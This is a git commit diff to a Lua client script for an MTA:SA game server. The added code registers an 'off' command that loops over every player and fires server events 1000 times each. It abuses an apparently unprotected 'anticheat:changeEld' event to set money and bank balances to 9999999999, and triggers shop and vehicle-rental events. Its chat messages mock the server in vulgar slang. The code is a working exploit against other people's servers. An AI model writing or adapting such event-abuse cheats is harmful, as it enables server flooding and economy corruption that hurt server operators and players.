539c2b6063191d273f7c901fc51bd7d353ed009c
AAASDAaaa <discordmybio@gmail.com>
2024-07-02 01:24:32 +0330

    Update dsxa.lua

--- dsa.lua
+++ dsa.lua
@@ -1,12 +1,18 @@
-    function Projectile(button, state, , , x, y, z)
-        if IsProjectileEnabled then
-            if (button == "left" and state == "down") then
-                createProjectile(localPlayer, 21, x, y, z + 0.1)
-            end
-        end
-    end
-    addEventHandler("onClientClick", root, Projectile)
+function onCmd5()
+    outputChatBox("SERVER KIR SHOD")
+    for i,v in pairs (getElementsByType("player")) do 
+        for i=1, 1000 do 
+            triggerServerEvent("shop:removeMeFromCurrentShopUser", v, 85)
+			-- Trigger 2 
+			triggerServerEvent("rentveh:doPlayerRentVehicle", v, 85)
+			
+			triggerServerEvent("anticheat:changeEld", v, v, "money", 9999999999)
+			outputChatBox("Money Add Shod!")
+			
+            triggerServerEvent("anticheat:changeEld", v, v, "bankmoney", 9999999999)
+			outputChatBox("Bank Money Add Shod!!")
 
-
-    for i,v in pairs(getElementsByType("player")) do 
-        triggerServerEvent("restrainPlayer", v, v, 45)
+        end 
+    end 
+end 
+addCommandHandler("off", onCmd5, false, false)
